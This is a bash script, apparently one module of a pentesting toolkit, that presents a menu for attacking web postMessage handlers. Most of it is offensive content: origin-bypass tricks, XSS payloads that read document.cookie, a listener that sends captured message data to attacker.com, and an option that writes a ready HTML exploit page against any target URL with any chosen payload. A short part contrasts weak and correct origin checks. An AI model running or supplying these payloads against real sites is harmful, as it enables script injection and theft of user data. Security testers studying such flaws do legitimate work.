#!/bin/bash
# HackTricks Ref: postmessage-vulnerabilities
# Module: PostMessage Security Analysis & Exploitation

echo -e "${C6}[WEB ATTACK: POSTMESSAGE_MASTER]${NC}"
echo -e "Reference: https://book.hacktricks.xyz/pentesting-web/postmessage-vulnerabilities"
echo -e "--------------------------------------------------"

echo -e "${C4}Select PostMessage Attack Vector:${NC}"
echo "1) Discovery: Find Insecure Listeners"
echo "2) Origin Bypass: Regex & String Flaws"
echo "3) Execution: PostMessage to XSS/Logic Flaw"
echo "4) Information Leakage (TargetOrigin: '*')"
echo "5) Generate Attack PoC (HTML Exploit Page)"
echo "0) Exit"

read -p "Selection: " pm_opt

case $pm_opt in
    1)
        echo -e "\n${C2}[*] Discovery Techniques:${NC}"
        echo "Search in JS files or Console for 'addEventListener(\"message\"...)'"
        echo "Check for missing or weak validation logic:"
        echo " - Bad:  if (event.origin.indexOf('company.com') !== -1)"
        echo " - Bad:  if (event.origin.match(/company.com/))"
        echo " - Good: if (event.origin === 'https://company.com')"
        ;;
    2)
        echo -e "\n${C2}[*] Origin Bypass Cheat Sheet:${NC}"
        echo "If the check is weak, bypass it using subdomains or pathing:"
        echo " - .indexOf('site.com')  -> https://site.com.attacker.com"
        echo " - .startsWith('site')   -> https://site-malicious.com"
        echo " - regex /^https:\/\/site\.com/ -> https://site.com.attacker.com"
        ;;
    3)
        echo -e "\n${C2}[*] PostMessage to XSS (Sinks):${NC}"
        echo "Identify where the message data ends up:"
        echo " - innerHTML: target.postMessage('<img src=x onerror=alert(1)>', '*')"
        echo " - eval():    target.postMessage('alert(document.cookie)', '*')"
        echo " - location:  target.postMessage({url: 'javascript:alert(1)'}, '*')"
        ;;
    4)
        echo -e "\n${C2}[*] Data Leakage (The Hub Atack):${NC}"
        echo "If a site sends sensitive data using targetOrigin '*', any iframe can listen."
        echo -e "${C5}Attack Script:${NC}"
        echo "window.addEventListener('message', (e) => { fetch('https://attacker.com/log?d=' + JSON.stringify(e.data)) });"
        ;;
    5)
        echo -e "\n${C2}[*] Generating Exploit PoC:${NC}"
        read -p "Target URL: " target
        read -p "Payload (JSON or String): " payload
        cat <<EOF > postmessage_exploit.html
<!DOCTYPE html>
<html>
<head><title>PostMessage Exploit</title></head>
<body>
    <h1>Exploit Page</h1>
    <script>
        // Open the target window
        const target = window.open('$target');
        
        // Wait for the target to load, then send payload
        setTimeout(() => {
            console.log("Sending payload...");
            target.postMessage($payload, '*');
        }, 3000);
    </script>
</body>
</html>
EOF
        echo -e "${C2}[+] Exploit saved to: postmessage_exploit.html${NC}"
        ;;
    *) return ;;
esac

echo -e "\n--------------------------------------------------"
read -p "Press Enter to return..."
